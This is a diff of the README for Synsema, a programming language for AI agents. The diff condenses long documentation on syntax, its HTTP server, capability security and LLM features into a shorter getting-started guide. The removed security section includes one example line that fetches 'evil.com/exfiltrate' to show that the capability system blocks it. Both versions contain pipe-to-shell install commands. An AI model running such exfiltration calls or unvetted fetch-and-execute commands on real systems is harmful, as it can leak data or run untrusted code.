@@ -1,650 +1,181 @@
 # Synsema
 
-A programming language designed for AI agents.
+**A programming language designed for AI agents.**
 
-Synsema is not a framework or a library — it's a language where observability, security, multi-agent coordination, human interaction, and LLM integration are built-in primitives, not afterthoughts. It compiles to a single native binary: no runtime, no GIL, true multi-core.
+Build agents, APIs and data workflows with LLM operations, scoped permissions,
+multi-agent coordination and human approval built into the language. Synsema uses
+readable `.syn` source files and ships as a single native executable.
 
-Site: [synsema.com](https://synsema.com/lang) · Docs: [synsema.dev](https://synsema.dev) · The platform: [synsema.com/platform](https://synsema.com/platform) · Learn by building: [try.synsema.org](https://try.synsema.org) · Changelog: [CHANGELOG.md](CHANGELOG.md) · Community: [Discord](https://discord.gg/qCJuwsF5bT)
+Run your programs with the Synsema engine, or bundle a program and its assets with
+the engine into a standalone executable for deployment.
 
-## Fast *and* secure
+[Website](https://synsema.com/lang) · [Documentation](https://synsema.dev) · [Learn by building](https://try.synsema.org) · [Changelog](CHANGELOG.md) · [Discord](https://discord.gg/qCJuwsF5bT)
 
-Synsema **matches or beats Go** — and adds deny-by-default security none of the
-mainstream stacks have. HTTP throughput, same workload, 50 concurrent connections:
+## Get started
 
-| Endpoint | Synsema | Go (net/http) | |
-|---|---|---|---|
-| `/plaintext` | **47.2k req/s** | 42.8k | beats Go |
-| `/health` | 38.7k req/s | 39.4k | ties (98%) |
-| `/json` | **41.8k req/s** | 40.7k | beats Go |
+Install on **macOS or Linux**:
 
-Synsema wins on plaintext and JSON and ties on health (run-to-run noise) — squarely in
-Go's tier and well above interpreted stacks like FastAPI. Unlike all of them, Synsema
-enforces **capability security at the language level** — no network, file, or DB access
-without an explicit `require`, route auth and input validation are declarative, and there's
-an automatic audit log. Security is a property of the language, not a discipline you have to
-remember.
-
-## Install
-
-A single self-contained binary — no Python, no npm, nothing to install on the target.
-
-```bash
-# one-liner (Linux/macOS) — once a release is published
+```sh
 curl -fsSL https://synsema.com/install.sh | sh
-
-# or from npm (Linux/macOS/Windows): the same native binary, no runtime involved
-npm i -g synsema        # then: synsema run app.syn
-npx synsema run app.syn # per project, no global install
 ```
 
-### Build from source
+Install on **Windows** with PowerShell:
 
-```bash
-git clone https://github.com/kitecosmic/synsema.git
-cd synsema
-cargo build --release --manifest-path engine/Cargo.toml   # → engine/target/release/synsema
+```powershell
+irm https://synsema.com/install.ps1 | iex
 ```
 
-## Quick start
+Or install through **npm** on Linux, macOS or Windows:
+
+```sh
+npm i -g synsema
+```
+
+The npm package installs the same native engine. Direct installs do not require
+Python or Node.js. See [releases](https://github.com/kitecosmic/synsema/releases)
+for downloadable binaries.
 
 Create `hello.syn`:
 
+```synsema
+intent: "Greet someone and check the result"
+
+task greet(name)
+    give "Hello, " + name + "!"
+
+print(greet("World"))
+
+test "greeting includes the name"
+    assert_eq(greet("Synsema"), "Hello, Synsema!")
 ```
-let name be "World"
-print("Hello, " + name + "!")
 
-task greet(person)
-    give "Welcome, " + person
+Run it and its test:
 
-print(greet("Alice"))
-```
-
-Run it:
-
-```bash
+```sh
 synsema run hello.syn
+synsema test hello.syn
 ```
 
-## Usage
+To scaffold a project with example code and configuration, use
+`synsema init my-project`. Update a direct installation with `synsema update`,
+or an npm installation with `npm i -g synsema@latest`.
 
-The command is `synsema` (e.g. `synsema run program.syn`,
-`synsema serve app.syn`).
+### Serve an API
 
-```bash
-synsema run program.syn              # Run a program
-synsema serve app.syn                # Run a program that starts an HTTP server (blocks)
-synsema run program.syn -v           # Run with verbose output
-synsema run program.syn --secure     # Run in secure mode (all capabilities must be granted)
-synsema run program.syn --provider anthropic  # Use Claude as LLM engine
-synsema run program.syn --grant net:api.example.com  # Grant a capability
-synsema run program.syn --audit      # Show capability audit trail
-synsema run program.fsyn             # Run flat (document-style) syntax
-synsema repl                         # Interactive mode
-synsema check program.syn            # Parse and validate without running
-synsema tokens program.syn           # Show token stream
-synsema ast program.syn              # Show abstract syntax tree
-synsema testgen program.syn          # Auto-generate and run tests
-```
+Save this as `app.syn`:
 
-## Language overview
-
-### Variables and types
-
-```
-let name be "Alice"
-let age be 30
-let active be true
-let items be [1, 2, 3]
-let config be {"host": "localhost", "port": 8080}
-```
-
-### Tasks (functions)
-
-```
-task add(a, b)
-    give a + b
-
-task factorial(n)
-    when n <= 1
-        give 1
-    otherwise
-        give n * factorial(n - 1)
-```
-
-### Flow control
-
-```
-when score >= 90
-    print("Excellent")
-otherwise when score >= 70
-    print("Good")
-otherwise
-    print("Keep trying")
-
-each item in items
-    print(item)
-
-match status
-    is "pending"
-        process()
-    is "done"
-        archive()
-```
-
-### Custom types
-
-```
-type Customer
-    name: text
-    email: text
-    balance: number
-
-let c be Customer("Alice", "alice@example.com", 500)
-print(name of c)
-```
-
-### Pipe operator
-
-```
-let result be data |> clean |> validate |> transform
-```
-
-### Intentional operations
-
-Instead of loops, express what you want:
-
-```
-let expensive be where(products, is_expensive)
-let names be collect(users, "name")
-let doubled be apply(double, numbers)
-let total be reduce(prices, add, 0)
-let sorted be sort_by(products, get_price)
-let groups be group_by(orders, get_status)
-```
-
-### Calibrated judgments (`judge`, v0.6.25+)
-
-Ask a System One model (Jev) typed questions about one value and get **probabilities**, not text —
-one call for the whole block, and a confidence your code can gate on:
-
-```
-require judge
-
-let v be judge ticket
-    refund: whether "The customer is asking for money back"
-    team:   choose "Which team should handle this?" between {"billing": "Payments", "technical": "Bugs"} or nothing
-    anger:  rate "How frustrated is the customer?" across ["Calm", "Frustrated", "Very angry"]
-
-when confidence of v.team < 0.8
-    approve "Route this ticket to " + text(v.team.choice) + "?"
-```
-
-`judge` is its own capability (`require judge`, not granted by `llm`), and offline it degrades to
-`available: false` with confidence 0 — never an invented number. See `skills/synsema/judge.md`.
-
-### Concurrency
-
-Real, multi-core parallelism — no GIL. `parallel_map` runs a task over a list
-concurrently, results in input order, with a bounded number of simultaneous workers:
-
-```
-let results be parallel_map(fetch_user, ids, 50)   -- 50 at a time, order preserved
-```
-
-`chunk` splits a list into batches — the "10k as 10×1000, then merge" pattern:
-
-```
-let batches be chunk(items, 1000)
-let partial be parallel_map(process_batch, batches, 10)   -- 10 batches in parallel
-let merged be flatten(partial)
-```
-
-`parallel_map(task, list)` returns the same result (and order) as `apply(task, list)` —
-it only adds concurrency. Fail-fast: the first error cancels the rest and propagates
-(wrap the task in `try/recover` to collect partial results instead).
-
-### HTTP server
-
-A native, zero-dependency HTTP server (built on `http.server`). The runtime
-enforces a consistent response contract, pagination, auth and input validation.
-
-```
+```synsema
 require serve(8080)
 
-task check_token(token)
-    when token == "admin-key"
-        give {"role": "admin"}
-    give nothing
-
 serve on 8080
-    auth with check_token
+    route "GET /hello/:name"
+        give {"message": "Hello, " + params.name + "!"}
 
-    route "GET /products"
-        give sql("SELECT id, name, price FROM products")     -- list → paginated envelope
-
-    route "GET /products/:id"
-        let rows be sql("SELECT * FROM products WHERE id = ?", [params.id])
-        when length(rows) == 0
-            give not_found("product not found")              -- 404
-        give rows[0]                                          -- map → object as-is
-
-    route "POST /products" requires auth
-        expect body {name: text, price: number}              -- 400 if invalid
-        let b be json of request
-        sql_exec("INSERT INTO products (name, price) VALUES (?, ?)", [name of b, price of b])
-        give created(b)                                       -- 201
+    route "POST /greet"
+        expect body {name: text}
+        give {"message": "Hello, " + request.json.name + "!"}
 ```
 
-- **Capability:** `require serve(PORT)` — scoped to the port. Without it, `serve on PORT` fails with a clear error.
-- **Request:** `request.json`, `request.body`, `request.headers`, `request.user`, plus `query` and `params` maps.
-- **Response contract:** `give <map>` → the object as-is; `give <list>` → `{"items", "count", "total", "cursor"}`; scalar → as-is; nothing → `null`. Helpers: `ok(x)`, `created(x)` (201), `not_found(x)` (404), `fail(code, msg)`.
-- **Pagination:** always applied to collections — default `limit` 100, `?limit=` / `?cursor=`, `total` always present. For large tables use `give paged("SELECT ...", [params])` — SQL `LIMIT`/`OFFSET` pushdown with an exact `COUNT(*)` total, nothing fully materialized.
-- **Auth:** `requires auth` extracts the `Authorization: Bearer` token, calls the `auth with` task; `nothing` → 401, otherwise the value lands in `request.user`. A task declared with **2 parameters** `(token, request)` also receives the request — that's how cookie sessions work (`request.cookies`, `set_cookie`/`clear_cookie`, argon2id passwords, JWT, TOTP).
-- **Agent identity:** the same auth task serves humans *and* agents. Return a verified **capability token** (`captoken_mint`/`captoken_attenuate`/`captoken_verify` — delegation that can only narrow, attenuated offline without the root key) or a verified **signed request** (`http_sign`/`http_signature_verify`, a pinned profile of RFC 9421 — a stolen token is useless without the key), and the runtime meters that identity: rate limit per identity on top of the per-IP shield, and `spend` booked and capped per identity, including the ceiling a captoken delegated. Third-party OIDC (`oidc_verify`, RS256/ES256 + JWKS) covers "log in with Google" and cloud workload identity; `/.well-known/synsema-auth` publishes the mechanisms for agents that never read the docs. Since v0.6.28 **the token is the ceiling**: what a captoken does not carry is denied at use (a generic `403 insufficient permissions`), also inside `sandbox under` blocks and `run_program` children; **passkeys** (`webauthn_register`/`webauthn_verify`) cover humans with device keys; a key is a portable identity (**`did:key`**, `canonical_json`, `document_sign`/`document_verify` as W3C Data Integrity, EdDSA JWTs verified by did); every unit of work can hand out a **receipt** — a Verifiable Credential derived from the audit, never written by the program — and every server publishes a signed **Agent Card** (A2A 1.0 shape) at `/.well-known/agent-card.json`.
-- **Validation:** `expect body {field: type}` (`text`, `number`, `bool`, `list`, `map`) → 400 naming the bad field.
-- **HTTP semantics:** `405` (with `Allow`) for a known path on the wrong method, `OPTIONS`/`HEAD` handled, malformed JSON → 400.
-- **Body limits:** default 1 MB, configurable per server with `max_body "10mb"` (or `"unlimited"`). Real bytes are counted (a lying `Content-Length` or chunked body can't evade it); over the limit → 413 with a clean connection close; large bodies stream to disk (`read_body()` / `request.body_file`), chunked supported.
-- **Isolation:** each request runs in its own scope on a pooled interpreter that is reset between requests (nothing a handler defines, prints or requires leaks into the next request); only the blackboard and DB are shared. Uncaught errors become 500 — never a server crash. Pool size: one worker per core (min 2), overridable with `SYNSEMA_SERVE_WORKERS` in the process environment.
-- **Streaming (SSE):** a route can `stream` and `send` events over time (LLM tokens, feeds, MCP) — `Content-Type: text/event-stream`, flushed per event, client-disconnect-safe, with a `max_streams` concurrency cap (`503` over the limit). `stream` and `give` are mutually exclusive per route.
-- **Rate limiting:** `rate_limit N per second|minute|hour` on the server (default) or per route (override; `none` to disable). Token bucket keyed by the real peer IP (not `X-Forwarded-For`), checked before auth, `429` + `Retry-After` + `RateLimit-*` over the limit, stale buckets purged.
-- **Soft keywords:** `serve`, `on`, `route`, `auth`, `requires`, `expect`, `max_body`, `max_streams`, `stream`, `send` are only special inside their construction — elsewhere they are ordinary names (`let route be "/x"` works).
+Start it with `synsema serve app.syn` and visit
+[`http://localhost:8080/hello/World`](http://localhost:8080/hello/World).
+The POST route validates the JSON body before running the handler.
 
-See [skills/synsema/serve.md](skills/synsema/serve.md) for full details.
+Continue with the [quickstart](https://synsema.dev/en/0.6.x/00-quickstart)
+and [examples](examples/).
 
-### Production web stack — no Caddy/nginx needed
+## What you can build
 
-The async-native server adds, natively, what you'd normally put a reverse proxy in front for:
+| Capability | Built into Synsema | Reference |
+| --- | --- | --- |
+| AI agents | `reason`, `decide`, `analyze`, `generate`, tool calling and response validation | [LLM integration](skills/synsema/llm.md) |
+| Agent coordination | Agents, shared blackboards, signals, resource locks and persistent memory | [Agents](skills/synsema/agents.md) · [Memory](skills/synsema/memory.md) |
+| Human oversight | `approve`, `confirm` and `ask` for decisions that need a person | [Syntax](skills/synsema/syntax.md) |
+| APIs and web apps | HTTP, WebSocket, SSE, request validation, authentication, TLS and templates | [Web server](skills/synsema/serve.md) |
+| Data workflows | SQL, CSV, Parquet, columnar tables, joins, aggregations and charts | [Data and visualization](skills/synsema/dataviz.md) |
+| Reusable libraries | `use` / `export`, pinned dependencies and capability review with `synsema get` | [Modules and packages](skills/synsema/modules.md) |
+| Deployment | Standalone app bundles, desktop apps, installable web apps and WebAssembly | [Deployment](skills/synsema/deploy.md) |
 
-```
-require serve(443)
-serve on 443
-    domain "example.com"
-    tls auto "admin@example.com"      -- auto-HTTPS: Let's Encrypt (ACME) + auto-renewal
-    redirect https                     -- also listen on :80 and 301 → https
-    route "GET /" ...
-```
+LLM operations connect to a configured provider. See the
+[provider setup](skills/synsema/llm.md); `synsema llm status` reports the resolved
+configuration and missing settings.
 
-- **TLS:** `tls cert "./c.pem" key "./k.pem"` (manual) or `tls auto "email"` (automatic
-  HTTPS via ACME — issuance + background renewal). TLS 1.2+ enforced, HSTS automatic, SNI.
-- **HTTP/2:** negotiated via ALPN over TLS (HTTP/1.1 kept).
-- **Virtual hosts:** `host "a.com"` / `host "*.tenant.com"` blocks, each with its own
-  routes/static/auth/cert; dispatched by the `Host` header.
-- **Reverse proxy:** `proxy to "http://upstream"` inside a route forwards the request.
-- **Production static files:** ETag + `304`, `Range`/`206`, gzip — on the `static` mounts.
+### Permissions you can inspect and constrain
 
-No external proxy, no extra processes — it's all in the one binary.
+Use `require` to scope access to network hosts, files, databases, secrets and other
+resources. The server enforces capability checks; plain `run` provides some ambient
+permissions for development. A host can impose a capability ceiling with
+`--sandbox` or `--cap-set` that the program and its dependencies cannot expand.
 
-## Security
+Packages declare their own capabilities, and dependency updates that add permissions
+require explicit acceptance. For sensitive workloads, Synsema also supports
+information-flow labels, audit receipts and attestation.
 
-Two walls, and they answer different questions. **Capabilities** answer *may this program touch the
-network at all?* **Information-flow labels** answer *may **this value** leave?* You can use the
-first without the second; the second is opt-in (`--labels`) and always on under `serve --attested`.
+Read about [capabilities](skills/synsema/capabilities.md),
+[secrets](skills/synsema/secrets.md), [information-flow labels](skills/synsema/labels.md)
+and [attestation](skills/synsema/attestation.md).
 
-### Capabilities
+## Set up your coding agent
 
-Zero access by default. Declare what you need:
+Install the Synsema skill so your coding agent can look up syntax, builtins,
+security rules and working patterns:
 
-```
-require net("api.example.com")
-require file("/data/*")
-
-let data be fetch("https://api.example.com/data")
-let content be read_file("/data/report.csv")
+```sh
+npx skills add kitecosmic/synsema --skill synsema -g -y
 ```
 
-### Information-flow labels (`--labels`, v0.6.24+)
+The skill uses the open [Agent Skills](https://agentskills.io) format and works
+with agents that support it, including Claude Code, Codex and Cursor.
+After updating Synsema, rerun the command to refresh the skill.
+See [agent setup](https://synsema.dev/en/0.6.x/02-ai-agents) for other installation
+methods, or read the [skill index](skills/synsema/INDEX.md) directly.
 
-Capabilities say what the program may *reach*. Labels say what a **value** may *become*. Mark it,
-and the engine follows it through every operation and every branch taken because of it:
+### Connect the documentation MCP
 
-```
-let balance be private(1200, "app")      -- belongs to the principal "app"
-let doubled be balance * 2               -- still private: every operation propagates
-give doubled                             -- label_violation: the response is a public sink
-give declassify(doubled, "the total is shown to the account holder")
-```
+The public docs MCP lets agents search documentation, retrieve examples and run
+or test snippets in a sandbox. It needs no API key.
 
-Every public sink — the HTTP response, files, the network, databases, processes, stdout — refuses a
-labelled value *and* refuses the call itself when it sits under a branch that depended on private
-data. The only way out is `declassify(value, "reason")`, which is recorded and listed by
-`synsema code check --json` **before the program runs**: that listing is the review.
+```sh
+# Claude Code
+claude mcp add --transport http synsema-docs https://synsema.dev/mcp
 
-Off by default, so `synsema run` is unchanged. Turn it on with `--labels`, and it is always on
-under `serve --attested` and inside a guest adapter. The full model, including the limits it does
-*not* cover, is in the skill's `labels.md`.
-
-### Attestation (`require attest`, `serve --attested`, v0.6.24+)
-
-For a confidential deployment: ask the platform for a document that binds what is running to the
-code that is running (AWS Nitro, TDX/SEV-SNP via configfs-tsm, dstack; plus a `mock` driver for CI
-that is never auto-detected). `serve --attested` generates a P-256 identity before the program's
-first statement, binds it and a hash of the program and its configuration into the document, serves
-TLS with that key, and publishes `GET /.well-known/attestation`. The client side is
-`attestation_verify(document, opts)`.
-
-Deny-by-default like every other capability, and absent from every packaged ceiling, so
-`--deterministic` denies it on its own. `synsema run --attest` is the job form: one JSON
-artefact binding program, input, output and configuration, verifiable offline. The whole
-surface — the five builtins, which drivers have been exercised on hardware and which have not,
-and what a client must check — is in the skill's `attestation.md`.
-
-### Intent
-
-Declare what your program is for. The intent is a human-readable description, used for auditing and as context for the LLM. It can be written in any language:
-
-```
-intent: "Read customer data from api.shop.com and generate reports"
+# Codex
+codex mcp add synsema-docs --url https://synsema.dev/mcp
 ```
 
-The intent is **descriptive** — it does not authorize actions. Security is enforced by capabilities, which are explicit and predictable:
+For other MCP clients, use the streamable HTTP endpoint `https://synsema.dev/mcp`.
+The sandbox restricts network and process access; check programs that need external
+services in your own environment.
 
-```
-require net("api.shop.com")
+## Explore and contribute
 
-fetch("https://api.shop.com/customers")   -- works: capability granted
-fetch("https://evil.com/exfiltrate")      -- BLOCKED: no capability for evil.com
-```
+- **Learn:** [Documentation](https://synsema.dev) · [Guided projects](https://try.synsema.org) · [Example programs](examples/)
+- **Use an editor:** [VS Code, Cursor and Windsurf extension](editors/vscode/README.md)
+- **Follow changes:** [Changelog](CHANGELOG.md) · [Releases](https://github.com/kitecosmic/synsema/releases)
+- **Ask or report a bug:** [Discord](https://discord.gg/qCJuwsF5bT) · [GitHub issues](https://github.com/kitecosmic/synsema/issues)
+- **Contribute:** Read [CONTRIBUTING.md](CONTRIBUTING.md) before proposing a code change.
+- **Explore the hosted platform:** [synsema.com/platform](https://synsema.com/platform)
 
-There is exactly one authorization model — capabilities — so behavior never depends on guessing the meaning of prose. The intent is frozen after declaration: a prompt injection cannot redeclare a broader intent.
+### Build from source
 
-### Per-task capabilities
+With the Rust toolchain installed:
 
-Tasks run in their own sandbox:
-
-```
-task fetch_orders()
-    require net("api.shop.com")
-    give fetch("https://api.shop.com/orders")
-
--- fetch_orders can ONLY access api.shop.com
--- even if the program has broader net capabilities
-```
-
-## LLM integration
-
-The LLM is the reasoning engine, swappable like a database driver:
-
-```
-let analysis be analyze sales_data for "trends"
-let action be decide between ["refund", "replace"] given complaint
-let response be generate "email" given ticket with tone = "empathetic"
+```sh
+git clone https://github.com/kitecosmic/synsema.git
+cd synsema
+cargo build --release --manifest-path engine/Cargo.toml
 ```
 
-Configure the provider:
+The executable is produced under `engine/target/release/`. To run the engine's
+unit and integration tests:
 
-```bash
-synsema run program.syn --provider anthropic   # Claude
-synsema run program.syn --provider openai       # GPT
-synsema run program.syn --provider ollama       # Local model
-```
-
-## Human interaction
-
-Approval gates, questions, and confirmations are language primitives:
-
-```
-approve "Deploy to production?"
-let choice be ask "Which environment?" with ["staging", "prod"]
-confirm "Send email to 500 customers?"
-show preview as "Email Preview"
-```
-
-## Multi-agent coordination
-
-```
-agent Researcher
-    require net("*.wikipedia.org")
-    task search(query)
-        let data be fetch(query)
-        share data as "research"
-
-agent Writer
-    observe "research" as data
-    let report be generate "report" given data
-
-spawn Researcher with query = "AI safety"
-```
-
-Agents coordinate via:
-- **Blackboard**: shared state with versioning and watchers
-- **Signals**: inter-agent messaging
-- **Resource locks**: preventive conflict detection (not after-the-fact)
-
-## Observability
-
-```
-trace "payment_processing"
-    log "Processing order " + order_id
-    measure "db_query"
-        let result be query(sql)
-    checkpoint "after_query"
-```
-
-### Rich error diagnostics
-
-When something fails, you get:
-
-```
-ERROR: orders.syn:12:16: Division by zero
-
-  Location: orders.syn:12:16
-  Intent: Calculate order totals
-
-  Source:
-     >>   12 |     give total / units
-
-  Variables at failure:
-    order = {customer: Alice, quantity: 0, price: 100}
-
-  Suggestions:
-    1. Add a guard: when quantity != 0
-    2. Add invariant: quantity > 0
-
-  Category: data
-  Recoverable: yes
-```
-
-### Automatic recovery
-
-The runtime tries to recover before failing:
-1. Retry with backoff (for IO errors)
-2. Fallback to cached/default data
-3. Partial results
-4. Speculative alternatives
-5. Human escalation with options and impact analysis
-
-## Agent memory and rules
-
-### Progress tracking
-
-```
-create_progress("sync", ["fetch", "validate", "update"])
-start_step("sync", "fetch")
-complete_step("sync", "fetch", "100 items")
--- If the agent crashes, resume_point("sync") returns where to continue
-```
-
-### Persistent memory
-
-```
-remember("preference", "Customer prefers formal tone", ["communication"])
-remember("learning", "API is slow on Mondays", ["api"])
-let prefs be recall("preference", ["communication"])
-```
-
-### Owner rules
-
-```
-add_rule("max_discount", "must", "discount <= 0.20", "pricing")
-add_rule("formal_tone", "prefer", "Use formal tone", "communication")
-let violations be check_rules("pricing", {"discount": 0.25})
-```
-
-Rule levels: `must` (hard block), `should` (warning), `avoid` (preference against), `prefer` (preference for).
-
-## Flat syntax
-
-For document-style readability, use `.fsyn` files:
-
-```
-task process_order(order):
-    When amount of order > 1000, approve "Large order".
-    Otherwise, log "Standard order".
-    Then give "processed".
-end
-```
-
-## Auto-generated tests
-
-```bash
-synsema testgen program.syn
-```
-
-Automatically generates edge-case tests from your types and task signatures:
-- Zero, negative, empty string, empty list, nothing
-- Type constructor arity checks
-- Invariant verification
-- Idempotency tests
-
-## Tests
-
-A conformance corpus plus unit and integration tests:
-
-```bash
+```sh
 cargo test --manifest-path engine/Cargo.toml --workspace
 ```
 
-Language-level `.syn` tests (using `assert` / `test "..."`) run with the binary:
-
-```bash
-synsema test tests/        # runs tests/*.test.syn
-```
-
-## Architecture
-
-A single native binary — no external runtime. The engine is organized into focused
-modules under `engine/crates/`:
-
-```
-engine/crates/
-├── synsema-core/         # lexer, parser, AST, types, interpreter, templates
-├── synsema-capabilities/ # capability model + intent enforcement
-├── synsema-stdlib/       # http, database, cron, server, ACME, mimetypes
-├── synsema-agents/       # blackboard, swarm, memory, progress, resource locking
-├── synsema-runtime/      # execution engine, serve, parallelism, recovery, persistence, daemon
-├── synsema-llm/          # LLM provider, context, validator, human interaction
-└── synsema-cli/          # the `synsema` command: run, serve, check, repl, ast, tokens, daemon
-```
-
-The interpreter is **synchronous**; concurrency (`parallel_map`) and the web server are
-async layers around it. `spawn` agents use OS threads.
-
-## Editor support (syntax highlighting)
-
-A VS Code–family extension highlights `.syn` / `.fsyn` (works in VS Code, Cursor, Windsurf,
-VSCodium). Install it **without cloning the repo**:
-
-```bash
-curl -L -o synsema.vsix https://github.com/kitecosmic/synsema/releases/latest/download/synsema-vscode.vsix
-code --install-extension synsema.vsix      # or: cursor / windsurf --install-extension
-```
-
-Source and details: [`editors/vscode/`](editors/vscode/README.md).
-
-## AI Skill and docs MCP (for any coding agent)
-
-Synsema ships a skill so coding agents can learn the language: [`skills/synsema/`](skills/synsema/SKILL.md),
-in the open [Agent Skills](https://agentskills.io) format (`SKILL.md` + one file per topic, read on
-demand). The same folder works in Claude Code, Codex, opencode, Cursor, Gemini CLI, GitHub Copilot,
-Windsurf and any other agent that reads skills.
-
-### Install the skill
-
-```bash
-# Any agent, once per machine: every project, every agent it detects (-a codex = just one)
-npx skills add kitecosmic/synsema -g -y
-
-# Without Node
-curl -fsSL https://raw.githubusercontent.com/kitecosmic/synsema/main/install-skill.sh | bash                  # ~/.claude/skills  (Claude Code)
-curl -fsSL https://raw.githubusercontent.com/kitecosmic/synsema/main/install-skill.sh | bash -s -- --agents    # ~/.agents/skills  (Codex, opencode, …)
-curl -fsSL https://raw.githubusercontent.com/kitecosmic/synsema/main/install-skill.sh | bash -s -- --dir <dir> # any other skills folder
-
-# As a plugin
-#   Claude Code:  /plugin marketplace add kitecosmic/synsema   then   /plugin install synsema@synsema
-#   Codex:        codex plugin marketplace add kitecosmic/synsema   then   codex plugin add synsema@synsema
-```
-
-Install it once per machine, not per project: without `-g` the skill goes into the current folder
-only. Re-run it after each `synsema update` so the skill matches the binary (`npx skills update -g`
-if you used npx). Claude Code reads `~/.claude/skills`, Codex `~/.agents/skills`, and opencode reads
-both: with a copy in each, update them together (`npx skills update -g` updates every global copy
-it installed). Agents without skill support can read
-[`skills/synsema/INDEX.md`](skills/synsema/INDEX.md) as context: it points to every other file.
-
-### The docs MCP
-
-`https://synsema.dev/mcp` (streamable HTTP, no key): search over the docs, any page, the doctested
-examples and a sandbox that runs and tests Synsema, so the agent checks its code before handing it
-over.
-
-```bash
-claude mcp add --transport http synsema-docs https://synsema.dev/mcp      # Claude Code
-codex mcp add synsema-docs --url https://synsema.dev/mcp                   # Codex
-gemini mcp add --transport http synsema-docs https://synsema.dev/mcp      # Gemini CLI
-```
-
-Cursor (`.cursor/mcp.json`) and most other clients: `{"mcpServers": {"synsema-docs": {"url": "https://synsema.dev/mcp"}}}`.
-opencode (`opencode.json`): `{"mcp": {"synsema-docs": {"type": "remote", "url": "https://synsema.dev/mcp"}}}`.
-
-### Skill index
-
-| File | When to read |
-|------|-------------|
-| [SKILL.md](skills/synsema/SKILL.md) | The entry point: the dev loop, how to stay current, every reference file |
-| [INDEX.md](skills/synsema/INDEX.md) | Which file answers which question |
-| [python-diff.md](skills/synsema/python-diff.md) | Read first when writing `.syn` code: the Python → Synsema table |
-| [syntax.md](skills/synsema/syntax.md) | Writing or reading `.syn` code — keywords, operators, statement patterns |
-| [builtins.md](skills/synsema/builtins.md) | Need to know what functions exist — all built-in tasks with signatures |
-| [types.md](skills/synsema/types.md) | Working with data — type system, property access, truthiness |
-| [capabilities.md](skills/synsema/capabilities.md) | Adding security — require, sandbox, intent, per-task scoping |
-| [serve.md](skills/synsema/serve.md) | The native HTTP server |
-| [agents.md](skills/synsema/agents.md) | Multi-agent work — blackboard, swarm, signals, resource locks |
-| [llm.md](skills/synsema/llm.md) | Using AI reasoning — reason, decide, analyze, generate, providers |
-| [pitfalls.md](skills/synsema/pitfalls.md) | Something failed — errors, their causes and fixes, upgrade notes |
-| [deploy.md](skills/synsema/deploy.md) | Daemon mode, Docker, VPS, Kubernetes, systemd, WebAssembly |
-
-The rest (labels, attestation, secrets, judge, data and charts, processes, frontend, memory,
-observability, guests, …) is listed in [SKILL.md](skills/synsema/SKILL.md).
-
-### LLM response validation
-
-When Synsema connects to an LLM, responses are validated automatically:
-
-- `decide` responses **must** be exactly one of the given options
-- Invalid responses trigger a retry (up to 3 attempts)
-- Each retry includes feedback: *"Your response was invalid because X"*
-- The LLM receives full program context: intent, variables, rules, memory, progress
-
-## Roadmap
-
-- [x] Native compiled runtime (single static binary, no GIL, real multi-core)
-- [x] Real concurrency (`parallel_map` / `chunk`, bounded fan-out)
-- [x] Web server capability (`serve on PORT`)
-- [x] Streaming responses (Server-Sent Events: `stream` / `send`)
-- [x] Rate limiting (`rate_limit N per <window>`, token bucket, per-IP)
-- [x] Native web stack: TLS, auto-HTTPS (ACME), virtual hosts, reverse proxy, HTTP/2
-- [x] Database (SQLite via `sql` / `db_open`)
-- [x] WebAssembly target (`synsema-wasm`, wasm32-wasip1): the pure profile for TEEs / confidential jobs / edge
-- [x] WebAssembly embeddable (`synsema-wasm-web`, `@synsema/wasm`): browser, Node/Bun, Python, Go — the host lends `http`/`kv`/`llm`; `serve` in handler mode for edge runtimes
-- [ ] Async interpreter for C100k+ I/O fan-out (deferred)
-- [ ] Distribution: cross-platform binaries, installer, mobile/IoT
-- [ ] Package manager for verified capabilities
-- [ ] Language server protocol (LSP) for IDE support
-
 ## License
 
-[Apache License 2.0](LICENSE). The code is free to use, modify, and distribute,
-with an explicit patent grant.
+[Apache License 2.0](LICENSE). Free to use, modify and distribute, with an explicit
+patent grant.
 
-**Trademark:** "Synsema" is a project trademark. The license covers the code, not the
-name — forks and derivative works must use a different name (see [NOTICE](NOTICE)).
+**Trademark:** "Synsema" is a project trademark. The license covers the code;
+forks and derivative works must use a different name. See [NOTICE](NOTICE).
